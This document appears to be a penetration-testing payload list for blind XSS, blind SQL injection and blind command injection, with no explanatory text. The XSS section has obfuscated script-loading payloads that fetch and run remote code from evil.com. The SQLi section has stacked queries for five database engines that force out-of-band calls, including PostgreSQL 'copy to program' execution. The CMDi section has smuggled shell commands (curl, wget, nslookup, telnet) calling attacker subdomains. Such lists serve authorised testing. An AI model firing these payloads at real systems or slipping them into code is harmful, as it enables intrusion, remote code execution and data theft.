# Blind XSS, SQLi, CMDi

## Blind XSS

```html
<script/src=//evil.com>
<script src=https://evil.com></script>
javascript:eval("var a=document.createElement('script');a.src='https://evil.com';document.body.appendChild(a)")
<input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
<svg src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
<video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
<iframe srcdoc="&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x76;&#x61;&#x72;&#x20;&#x61;&#x3d;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x72;&#x65;&#x61;&#x74;&#x65;&#x45;&#x6c;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x28;&#x22;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x29;&#x3b;&#x61;&#x2e;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x65;&#x76;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x3b;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x62;&#x6f;&#x64;&#x79;&#x2e;&#x61;&#x70;&#x70;&#x65;&#x6e;&#x64;&#x43;&#x68;&#x69;&#x6c;&#x64;&#x28;&#x61;&#x29;&#x3b;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;">
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET","//evil.com");a.send();</script>
<script>$.getScript("//evil.com")</script>
"><script/src=//evil.com>
"><script src=https://evil.com></script>
">javascript:eval("var a=document.createElement('script');a.src='https://evil.com';document.body.appendChild(a)")
"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
"><svg src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
"><iframe srcdoc="&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x76;&#x61;&#x72;&#x20;&#x61;&#x3d;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x72;&#x65;&#x61;&#x74;&#x65;&#x45;&#x6c;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x28;&#x22;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x29;&#x3b;&#x61;&#x2e;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x65;&#x76;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x3b;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x62;&#x6f;&#x64;&#x79;&#x2e;&#x61;&#x70;&#x70;&#x65;&#x6e;&#x64;&#x43;&#x68;&#x69;&#x6c;&#x64;&#x28;&#x61;&#x29;&#x3b;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;">
"><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET","//evil.com");a.send();</script>
"><script>$.getScript("//evil.com")</script>
"-->'><script/src=//evil.com>
"-->'><script src=https://evil.com></script>
"-->'>javascript:eval("var a=document.createElement('script');a.src='https://evil.com';document.body.appendChild(a)")
"-->'><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
"-->'><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
"-->'><svg src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
"-->'><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXZpbC5jb20iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
"-->'><iframe srcdoc="&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x76;&#x61;&#x72;&#x20;&#x61;&#x3d;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x72;&#x65;&#x61;&#x74;&#x65;&#x45;&#x6c;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x28;&#x22;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x29;&#x3b;&#x61;&#x2e;&#x73;&#x72;&#x63;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x65;&#x76;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x3b;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x2e;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x62;&#x6f;&#x64;&#x79;&#x2e;&#x61;&#x70;&#x70;&#x65;&#x6e;&#x64;&#x43;&#x68;&#x69;&#x6c;&#x64;&#x28;&#x61;&#x29;&#x3b;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;">
"-->'><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET","//evil.com");a.send();</script>
"-->'><script>$.getScript("//evil.com")</script>
<![CDATA[<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load",b);a.open("GET","//evil.com");a.send();</script>]]>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load",b);a.open("GET","//evil.com");a.send();</something:script>
```

## Blind SQLi
```sql
; SELECT * FROM url('http://sqli-ch1.evil.com', 'CSV', col String);--
; copy (SELECT '') to program 'nslookup sqli-pg1.evil.com';--
; SELECT LOAD_FILE('\\\\\\\\sqli-mysql1.evil.com\\\\');--
; SELECT UTL_INADDR.get_host_address('sqli-oracle1.evil.com');--
; exec master..xp_dirtree '//sqli-mssql1.evil.com/a';--
'; SELECT * FROM url('http://sqli-ch2.evil.com', 'CSV', col String);--
'; copy (SELECT '') to program 'nslookup sqli-pg2.evil.com';--
'; SELECT LOAD_FILE('\\\\\\\\sqli-mysql2.evil.com\\\\');--
'; SELECT UTL_INADDR.get_host_address('sqli-oracle2.evil.com');--
'; exec master..xp_dirtree '//sqli-mssql2.evil.com/a';--
'); SELECT * FROM url('http://sqli-ch3.evil.com', 'CSV', col String);--
'); copy (SELECT '') to program 'nslookup sqli-pg3.evil.com';--
'); SELECT LOAD_FILE('\\\\\\\\sqli-mysql3.evil.com\\\\');--
'); SELECT UTL_INADDR.get_host_address('sqli-oracle3.evil.com');--
'); exec master..xp_dirtree '//sqli-mssql3.evil.com/a';--
); SELECT * FROM url('http://sqli-ch4.evil.com', 'CSV', col String);--
); copy (SELECT '') to program 'nslookup sqli-pg4.evil.com';--
); SELECT LOAD_FILE('\\\\\\\\sqli-mysql4.evil.com\\\\');--
); SELECT UTL_INADDR.get_host_address('sqli-oracle4.evil.com');--
); exec master..xp_dirtree '//sqli-mssql4.evil.com/a';--
')); SELECT * FROM url('http://sqli-ch5.evil.com', 'CSV', col String);--
')); copy (SELECT '') to program 'nslookup sqli-pg5.evil.com';--
')); SELECT LOAD_FILE('\\\\\\\\sqli-mysql5.evil.com\\\\');--
')); SELECT UTL_INADDR.get_host_address('sqli-oracle5.evil.com');--
')); exec master..xp_dirtree '//sqli-mssql5.evil.com/a';--
',''); SELECT * FROM url('http://sqli-ch6.evil.com', 'CSV', col String);--
',''); copy (SELECT '') to program 'nslookup sqli-pg6.evil.com';--
',''); SELECT LOAD_FILE('\\\\\\\\sqli-mysql6.evil.com\\\\');--
',''); SELECT UTL_INADDR.get_host_address('sqli-oracle6.evil.com');--
',''); exec master..xp_dirtree '//sqli-mssql6.evil.com/a';--
','',''); SELECT * FROM url('http://sqli-ch7.evil.com', 'CSV', col String);--
','',''); copy (SELECT '') to program 'nslookup sqli-pg7.evil.com';--
','',''); SELECT LOAD_FILE('\\\\\\\\sqli-mysql7.evil.com\\\\');--
','',''); SELECT UTL_INADDR.get_host_address('sqli-oracle7.evil.com');--
','',''); exec master..xp_dirtree '//sqli-mssql7.evil.com/a';--
','','',''); SELECT * FROM url('http://sqli-ch8.evil.com', 'CSV', col String);--
','','',''); copy (SELECT '') to program 'nslookup sqli-pg8.evil.com';--
','','',''); SELECT LOAD_FILE('\\\\\\\\sqli-mysql8.evil.com\\\\');--
','','',''); SELECT UTL_INADDR.get_host_address('sqli-oracle8.evil.com');--
','','',''); exec master..xp_dirtree '//sqli-mssql8.evil.com/a';--
','','','',''); SELECT * FROM url('http://sqli-ch9.evil.com', 'CSV', col String);--
','','','',''); copy (SELECT '') to program 'nslookup sqli-pg9.evil.com';--
','','','',''); SELECT LOAD_FILE('\\\\\\\\sqli-mysql9.evil.com\\\\');--
','','','',''); SELECT UTL_INADDR.get_host_address('sqli-oracle9.evil.com');--
','','','',''); exec master..xp_dirtree '//sqli-mssql9.evil.com/a';--
',1); SELECT * FROM url('http://sqli-ch10.evil.com', 'CSV', col String);--
',1); copy (SELECT '') to program 'nslookup sqli-pg10.evil.com';--
',1); SELECT LOAD_FILE('\\\\\\\\sqli-mysql10.evil.com\\\\');--
',1); SELECT UTL_INADDR.get_host_address('sqli-oracle10.evil.com');--
',1); exec master..xp_dirtree '//sqli-mssql10.evil.com/a';--
',1,1); SELECT * FROM url('http://sqli-ch11.evil.com', 'CSV', col String);--
',1,1); copy (SELECT '') to program 'nslookup sqli-pg11.evil.com';--
',1,1); SELECT LOAD_FILE('\\\\\\\\sqli-mysql11.evil.com\\\\');--
',1,1); SELECT UTL_INADDR.get_host_address('sqli-oracle11.evil.com');--
',1,1); exec master..xp_dirtree '//sqli-mssql11.evil.com/a';--
',1,1,1); SELECT * FROM url('http://sqli-ch12.evil.com', 'CSV', col String);--
',1,1,1); copy (SELECT '') to program 'nslookup sqli-pg12.evil.com';--
',1,1,1); SELECT LOAD_FILE('\\\\\\\\sqli-mysql12.evil.com\\\\');--
',1,1,1); SELECT UTL_INADDR.get_host_address('sqli-oracle12.evil.com');--
',1,1,1); exec master..xp_dirtree '//sqli-mssql12.evil.com/a';--
',1,1,1,1); SELECT * FROM url('http://sqli-ch13.evil.com', 'CSV', col String);--
',1,1,1,1); copy (SELECT '') to program 'nslookup sqli-pg13.evil.com';--
',1,1,1,1); SELECT LOAD_FILE('\\\\\\\\sqli-mysql13.evil.com\\\\');--
',1,1,1,1); SELECT UTL_INADDR.get_host_address('sqli-oracle13.evil.com');--
',1,1,1,1); exec master..xp_dirtree '//sqli-mssql13.evil.com/a';--
,1); SELECT * FROM url('http://sqli-ch14.evil.com', 'CSV', col String);--
,1); copy (SELECT '') to program 'nslookup sqli-pg14.evil.com';--
,1); SELECT LOAD_FILE('\\\\\\\\sqli-mysql14.evil.com\\\\');--
,1); SELECT UTL_INADDR.get_host_address('sqli-oracle14.evil.com');--
,1); exec master..xp_dirtree '//sqli-mssql14.evil.com/a';--
-1); SELECT * FROM url('http://sqli-ch15.evil.com', 'CSV', col String);--
-1); copy (SELECT '') to program 'nslookup sqli-pg15.evil.com';--
-1); SELECT LOAD_FILE('\\\\\\\\sqli-mysql15.evil.com\\\\');--
-1); SELECT UTL_INADDR.get_host_address('sqli-oracle15.evil.com');--
-1); exec master..xp_dirtree '//sqli-mssql15.evil.com/a';--
-1; SELECT * FROM url('http://sqli-ch16.evil.com', 'CSV', col String);--
-1; copy (SELECT '') to program 'nslookup sqli-pg16.evil.com';--
-1; SELECT LOAD_FILE('\\\\\\\\sqli-mysql16.evil.com\\\\');--
-1; SELECT UTL_INADDR.get_host_address('sqli-oracle16.evil.com');--
-1; exec master..xp_dirtree '//sqli-mssql16.evil.com/a';--
,1,1); SELECT * FROM url('http://sqli-ch17.evil.com', 'CSV', col String);--
,1,1); copy (SELECT '') to program 'nslookup sqli-pg17.evil.com';--
,1,1); SELECT LOAD_FILE('\\\\\\\\sqli-mysql17.evil.com\\\\');--
,1,1); SELECT UTL_INADDR.get_host_address('sqli-oracle17.evil.com');--
,1,1); exec master..xp_dirtree '//sqli-mssql17.evil.com/a';--
,1,1,1); SELECT * FROM url('http://sqli-ch18.evil.com', 'CSV', col String);--
,1,1,1); copy (SELECT '') to program 'nslookup sqli-pg18.evil.com';--
,1,1,1); SELECT LOAD_FILE('\\\\\\\\sqli-mysql18.evil.com\\\\');--
,1,1,1); SELECT UTL_INADDR.get_host_address('sqli-oracle18.evil.com');--
,1,1,1); exec master..xp_dirtree '//sqli-mssql18.evil.com/a';--
,1,1,1,1); SELECT * FROM url('http://sqli-ch19.evil.com', 'CSV', col String);--
,1,1,1,1); copy (SELECT '') to program 'nslookup sqli-pg19.evil.com';--
,1,1,1,1); SELECT LOAD_FILE('\\\\\\\\sqli-mysql19.evil.com\\\\');--
,1,1,1,1); SELECT UTL_INADDR.get_host_address('sqli-oracle19.evil.com');--
,1,1,1,1); exec master..xp_dirtree '//sqli-mssql19.evil.com/a';--
```

## Blind CMDi
```shell
nslookup cmdi-nslookup1.evil.com
curl cmdi-curl1.evil.com
wget cmdi-wget1.evil.com
ping -c 1 cmdi-ping1.evil.com
telnet cmdi-telnet1.evil.com
ssh cmdi-ssh1.evil.com
nslookup cmdi-nslookup2.evil.com #
curl cmdi-curl2.evil.com #
wget cmdi-wget2.evil.com #
ping -c 1 cmdi-ping2.evil.com #
telnet cmdi-telnet2.evil.com #
ssh cmdi-ssh2.evil.com #
; nslookup cmdi-nslookup3.evil.com #
; curl cmdi-curl3.evil.com #
; wget cmdi-wget3.evil.com #
; ping -c 1 cmdi-ping3.evil.com #
; telnet cmdi-telnet3.evil.com #
; ssh cmdi-ssh3.evil.com #
 && nslookup cmdi-nslookup4.evil.com #
 && curl cmdi-curl4.evil.com #
 && wget cmdi-wget4.evil.com #
 && ping -c 1 cmdi-ping4.evil.com #
 && telnet cmdi-telnet4.evil.com #
 && ssh cmdi-ssh4.evil.com #
 | nslookup cmdi-nslookup5.evil.com | 
 | curl cmdi-curl5.evil.com | 
 | wget cmdi-wget5.evil.com | 
 | ping -c 1 cmdi-ping5.evil.com | 
 | telnet cmdi-telnet5.evil.com | 
 | ssh cmdi-ssh5.evil.com | 
 nslookup cmdi-nslookup6.evil.com
 curl cmdi-curl6.evil.com
 wget cmdi-wget6.evil.com
 ping -c 1 cmdi-ping6.evil.com
 telnet cmdi-telnet6.evil.com
 ssh cmdi-ssh6.evil.com
 nslookup cmdi-nslookup7.evil.com #
 curl cmdi-curl7.evil.com #
 wget cmdi-wget7.evil.com #
 ping -c 1 cmdi-ping7.evil.com #
 telnet cmdi-telnet7.evil.com #
 ssh cmdi-ssh7.evil.com #
```
